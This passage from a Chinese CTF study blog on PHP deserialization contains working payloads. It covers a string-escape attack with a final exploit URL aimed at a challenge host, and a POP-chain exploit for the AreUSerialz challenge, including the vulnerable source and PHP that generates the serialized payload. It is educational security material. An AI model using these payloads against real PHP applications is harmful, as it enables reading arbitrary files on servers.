<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;A&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;username&quot;</span>;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;UN&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;s:<span class="hljs-number">82</span>:<span class="hljs-string">&quot;;s:8:&quot;</span>password<span class="hljs-string">&quot;;O:1:&quot;</span>B<span class="hljs-string">&quot;:1:&#123;s:1:&quot;</span>b<span class="hljs-string">&quot;;O:1:&quot;</span>C<span class="hljs-string">&quot;:1:&#123;s:1:&quot;</span>c<span class="hljs-string">&quot;;s:8:&quot;</span>flag.php<span class="hljs-string">&quot;;&#125;&#125;s:0:&quot;</span><span class="hljs-string">&quot;;s:0&quot;</span><span class="hljs-string">&quot;;&#125;</span><br></code></pre></td></tr></table></figure>

<p>然后去考虑如何才能吃掉：</p>
<p>替换规则是\0\0\0 替换为0*0 是六到三的替换</p>
<p>也就是每一组替换可以吃掉3个长度的字符</p>
<p>需要吃掉的内容：”;s:8:”password”;s:82:</p>
<p>用python测一下长度</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">&gt;&gt;&gt; <span class="hljs-title function_ invoke__">len</span>(<span class="hljs-string">&#x27;&#x27;</span><span class="hljs-string">&#x27;&quot;;s:8:&quot;password&quot;;s:82:&#x27;</span><span class="hljs-string">&#x27;&#x27;</span>)<br><span class="hljs-number">22</span><br>&gt;&gt;&gt; <span class="hljs-number">22</span>/<span class="hljs-number">3</span><br><span class="hljs-number">7.333333333333333</span><br></code></pre></td></tr></table></figure>

<p>不是3的整数倍 所以需要自己添加值凑成3的倍数</p>
<p>把前面的UN也吃掉就好了：UN”;s:8:”password”;s:82:</p>
<p>然后继续利用python生成\0\0\0 共8组</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php">&gt;&gt;&gt; <span class="hljs-string">&#x27;\0\0\0&#x27;</span><br><span class="hljs-string">&#x27;\x00\x00\x00&#x27;</span><br>&gt;&gt;&gt; <span class="hljs-string">&#x27;\\0\\0\\0&#x27;</span><br><span class="hljs-string">&#x27;\\0\\0\\0&#x27;</span><br>&gt;&gt;&gt; <span class="hljs-string">&#x27;\\0\\0\\0&#x27;</span> * <span class="hljs-number">8</span><br><span class="hljs-string">&#x27;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&#x27;</span><br>&gt;&gt;&gt;<br></code></pre></td></tr></table></figure>

<p>因为转义 所以双杠后自己替换一下就好了</p>
<p>因为决定某个值的长度不是双引号的闭合 而是前面的数字</p>
<p>所以把我们生成的替换字符放进去就会多读取后面的内容</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0xx&#x27;</span>;  <span class="hljs-comment">//后面补充两个字符 因为24-22=2 去补充</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;&#125;&#125;s:0:&quot;&quot;;s:0&quot;&#x27;</span>;<br>   <br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> A)<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>生成：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;A&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;username&quot;</span>;s:<span class="hljs-number">50</span>:<span class="hljs-string">&quot;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0xx&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;s:<span class="hljs-number">82</span>:<span class="hljs-string">&quot;;s:8:&quot;</span>password<span class="hljs-string">&quot;;O:1:&quot;</span>B<span class="hljs-string">&quot;:1:&#123;s:1:&quot;</span>b<span class="hljs-string">&quot;;O:1:&quot;</span>C<span class="hljs-string">&quot;:1:&#123;s:1:&quot;</span>c<span class="hljs-string">&quot;;s:8:&quot;</span>flag.php<span class="hljs-string">&quot;;&#125;&#125;s:0:&quot;</span><span class="hljs-string">&quot;;s:0&quot;</span><span class="hljs-string">&quot;;&#125;</span><br></code></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">&gt;&gt;&gt; <span class="hljs-title function_ invoke__">len</span>(<span class="hljs-string">&#x27;&#x27;</span><span class="hljs-string">&#x27;xx&quot;;s:8:&quot;password&quot;;s:82:&#x27;</span><span class="hljs-string">&#x27;&#x27;</span>)<br><span class="hljs-number">24</span><br>&gt;&gt;&gt;正好是往后面读取<span class="hljs-number">24</span>个<br></code></pre></td></tr></table></figure>

<p>但此时出现的问题时 你自己补充了两个xx确实后面吃的个数是24但是属性值前面的50也是补充后的结果 6*8 = 48-&gt;24 那么虽然补充了两个xx 但是意味着需要往后读50-24 = 26个字符长度 故读取失败</p>
<p>所以我们的补位不应该出现在这个属性值里面 而是在外面</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;A&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;username&quot;</span>;s:<span class="hljs-number">50</span>:<span class="hljs-string">&quot;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;s:<span class="hljs-number">82</span>:<span class="hljs-string">&quot;;s:8:&quot;</span>password<span class="hljs-string">&quot;;O:1:&quot;</span>B<span class="hljs-string">&quot;:1:&#123;s:1:&quot;</span>b<span class="hljs-string">&quot;;O:1:&quot;</span>C<span class="hljs-string">&quot;:1:&#123;s:1:&quot;</span>c<span class="hljs-string">&quot;;s:8:&quot;</span>flag.php<span class="hljs-string">&quot;;&#125;&#125;s:0:&quot;</span><span class="hljs-string">&quot;;s:0&quot;</span><span class="hljs-string">&quot;;&#125;</span><br></code></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&#x27;</span>;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;x&quot;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;&#125;&#125;s:0:&quot;&quot;;s:0&quot;&#x27;</span>;  <span class="hljs-comment">//在这里的开头补充x&quot; 相当于补充了两位</span><br>   <br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> A)<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;A&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;username&quot;</span>;s:<span class="hljs-number">48</span>:<span class="hljs-string">&quot;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;s:<span class="hljs-number">84</span>:<span class="hljs-string">&quot;x&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;B&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;b&quot;</span>;O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;C&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;c&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;flag.php&quot;</span>;&#125;&#125;s:<span class="hljs-number">0</span>:<span class="hljs-string">&quot;&quot;</span>;s:<span class="hljs-number">0</span><span class="hljs-string">&quot;&quot;</span>;&#125;<br></code></pre></td></tr></table></figure>

<p>此时往后读24</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">&gt;&gt;&gt; <span class="hljs-title function_ invoke__">len</span>(<span class="hljs-string">&#x27;&#x27;</span><span class="hljs-string">&#x27;&quot;;s:8:&quot;password&quot;;s:84:&quot;x&#x27;</span><span class="hljs-string">&#x27;&#x27;</span>)<br><span class="hljs-number">24</span><br></code></pre></td></tr></table></figure>

<p>最终payload为：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">http:<span class="hljs-comment">//122.114.252.87:2030/?a=\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&amp;b=x&quot;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;&#125;&#125;s:0:&quot;&quot;;s:0&quot;</span><br></code></pre></td></tr></table></figure>

<p>url编码一下即可</p>
<p>成功获取flag！：flag{a6c175ea-d851-5cf1-cd6f-3aad733ae896}</p>
<hr>
<h2 id="0718-Phar反序列化"><a href="#0718-Phar反序列化" class="headerlink" title="0718 Phar反序列化"></a>0718 Phar反序列化</h2><h6 id="例题：-网鼎杯-2020-青龙组-AreUSerialz"><a href="#例题：-网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="例题：[网鼎杯 2020 青龙组]AreUSerialz"></a>例题：[网鼎杯 2020 青龙组]AreUSerialz</h6><h6 id="题目：-4"><a href="#题目：-4" class="headerlink" title="题目："></a>题目：</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileHandler</span> </span>&#123;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$op</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$filename</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$content</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$op</span> = <span class="hljs-string">&quot;1&quot;</span>;<br>        <span class="hljs-variable">$filename</span> = <span class="hljs-string">&quot;/tmp/tmpfile&quot;</span>;<br>        <span class="hljs-variable">$content</span> = <span class="hljs-string">&quot;Hello World!&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">process</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">process</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op == <span class="hljs-string">&quot;1&quot;</span>) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write</span>();<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op == <span class="hljs-string">&quot;2&quot;</span>) &#123;<br>            <span class="hljs-variable">$res</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">read</span>();<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-variable">$res</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Bad Hacker!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;filename) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;content)) &#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>((<span class="hljs-keyword">string</span>)<span class="hljs-variable language_">$this</span>-&gt;content) &gt; <span class="hljs-number">100</span>) &#123;<br>                <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Too long!&quot;</span>);<br>                <span class="hljs-keyword">die</span>();<br>            &#125;<br>            <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename, <span class="hljs-variable">$this</span>-&gt;content);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$res</span>) <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Successful!&quot;</span>);<br>            <span class="hljs-keyword">else</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Failed!&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Failed!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">read</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$res</span> = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;filename)) &#123;<br>            <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$res</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">output</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;[Result]: &lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$s</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op === <span class="hljs-string">&quot;2&quot;</span>)<br>            <span class="hljs-variable language_">$this</span>-&gt;op = <span class="hljs-string">&quot;1&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;content = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">process</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_valid</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) </span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$s</span>); <span class="hljs-variable">$i</span>++)<br>        <span class="hljs-keyword">if</span>(!(<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>]) &gt;= <span class="hljs-number">32</span> &amp;&amp; <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>]) &lt;= <span class="hljs-number">125</span>))<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>&#123;<span class="hljs-string">&#x27;str&#x27;</span>&#125;)) &#123;<br>    <span class="hljs-variable">$str</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;str&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_valid</span>(<span class="hljs-variable">$str</span>)) &#123;<br>        <span class="hljs-variable">$obj</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$str</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><strong>寻找pop链：</strong></p>
<p>可以发现在read方法中存在file_get_contents函数，是可以利用获取flag的地方，所以需要我们调用read方法 可以发现在process方法中找到，就需要调用process方法并且需要op为2 所以construct方法中的无法使用，需要使用destruct方法，需要绕过他的强类型比较 将op设置为数字型的2 在强类型比较中字符型和数字型的2是不相等的 但在弱类型比较中是相等的 数字2就不加引号就可以了</p>
<p><strong>绕过上传点的限制：</strong></p>
<p>在is_valid函数中对ascii码进行一定检测，有限定范围 但是我们生成的序列化中存在\0字符，需要通过S的hex机制进行绕过检测</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileHandler</span> </span>&#123;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$op</span> = <span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$filename</span> = <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$content</span>;<br><br>    <span class="hljs-comment">// function __construct() &#123;</span><br>    <span class="hljs-comment">//     $op = &quot;1&quot;;</span><br>    <span class="hljs-comment">//     $filename = &quot;/tmp/tmpfile&quot;;</span><br>    <span class="hljs-comment">//     $content = &quot;Hello World!&quot;;</span><br>    <span class="hljs-comment">//     $this-&gt;process();</span><br>    <span class="hljs-comment">// &#125;</span><br><br>    <span class="hljs-comment">// public function process() &#123;</span><br>    <span class="hljs-comment">//     if($this-&gt;op == &quot;1&quot;) &#123;</span><br>    <span class="hljs-comment">//         $this-&gt;write();</span><br>    <span class="hljs-comment">//     &#125; else if($this-&gt;op == &quot;2&quot;) &#123;</span><br>    <span class="hljs-comment">//         $res = $this-&gt;read();</span><br>    <span class="hljs-comment">//         $this-&gt;output($res);</span><br>    <span class="hljs-comment">//     &#125; else &#123;</span><br>    <span class="hljs-comment">//         $this-&gt;output(&quot;Bad Hacker!&quot;);</span><br>    <span class="hljs-comment">//     &#125;</span><br>    <span class="hljs-comment">// &#125;</span><br><br>    <span class="hljs-comment">// private function write() &#123;</span><br>    <span class="hljs-comment">//     if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123;</span><br>    <span class="hljs-comment">//         if(strlen((string)$this-&gt;content) &gt; 100) &#123;</span><br>    <span class="hljs-comment">//             $this-&gt;output(&quot;Too long!&quot;);</span><br>    <span class="hljs-comment">//             die();</span><br>    <span class="hljs-comment">//         &#125;</span><br>    <span class="hljs-comment">//         $res = file_put_contents($this-&gt;filename, $this-&gt;content);</span><br>    <span class="hljs-comment">//         if($res) $this-&gt;output(&quot;Successful!&quot;);</span><br>    <span class="hljs-comment">//         else $this-&gt;output(&quot;Failed!&quot;);</span><br>    <span class="hljs-comment">//     &#125; else &#123;</span><br>    <span class="hljs-comment">//         $this-&gt;output(&quot;Failed!&quot;);</span><br>    <span class="hljs-comment">//     &#125;</span><br>    <span class="hljs-comment">// &#125;</span><br><br>    <span class="hljs-comment">// private function read() &#123;</span><br>    <span class="hljs-comment">//     $res = &quot;&quot;;</span><br>    <span class="hljs-comment">//     if(isset($this-&gt;filename)) &#123;</span><br>    <span class="hljs-comment">//         $res = file_get_contents($this-&gt;filename);</span><br>    <span class="hljs-comment">//     &#125;</span><br>    <span class="hljs-comment">//     return $res;</span><br>    <span class="hljs-comment">// &#125;</span><br><br>    <span class="hljs-comment">// private function output($s) &#123;</span><br>    <span class="hljs-comment">//     echo &quot;[Result]: &lt;br&gt;&quot;;</span><br>    <span class="hljs-comment">//     echo $s;</span><br>    <span class="hljs-comment">// &#125;</span><br><br>    <span class="hljs-comment">// function __destruct() &#123;</span><br>    <span class="hljs-comment">//     if($this-&gt;op === &quot;2&quot;)</span><br>    <span class="hljs-comment">//         $this-&gt;op = &quot;1&quot;;</span><br>    <span class="hljs-comment">//     $this-&gt;content = &quot;&quot;;</span><br>    <span class="hljs-comment">//     $this-&gt;process();</span><br>    <span class="hljs-comment">// &#125;</span><br><br>&#125;<br><br><span class="hljs-comment">// echo urlencode(serialize(new FileHandler));</span><br><span class="hljs-comment">// O%3A11%3A%22FileHandler%22%3A3%3A%7Bs%3A5%3A%22%00%2A%00op%22%3Bi%3A2%3Bs%3A11%3A%22%00%2A%00filename%22%3Bs%3A8%3A%22flag.php%22%3Bs%3A10%3A%22%00%2A%00content%22%3BN%3B%7D</span><br><span class="hljs-comment">// 因为上传的时候存在检测ascii码存在一定的范围</span><br><br><span class="hljs-variable">$ser</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileHandler</span>);<br><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$ser</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">decorate</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>)</span>&#123;<br>    <span class="hljs-variable">$arr</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;:&#x27;</span>,<span class="hljs-variable">$s</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$arr</span>); <span class="hljs-variable">$i</span>++)&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$arr</span>[<span class="hljs-variable">$i</span>],<span class="hljs-string">&quot;\0&quot;</span>) != <span class="hljs-literal">false</span>)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$arr</span>[<span class="hljs-variable">$i</span>].<span class="hljs-string">&quot;\n&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$arr</span>[<span class="hljs-variable">$i</span>-<span class="hljs-number">2</span>].<span class="hljs-string">&quot;\n&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-title function_ invoke__">decorate</span>(<span class="hljs-variable">$ser</span>);<br><br><br><br><span 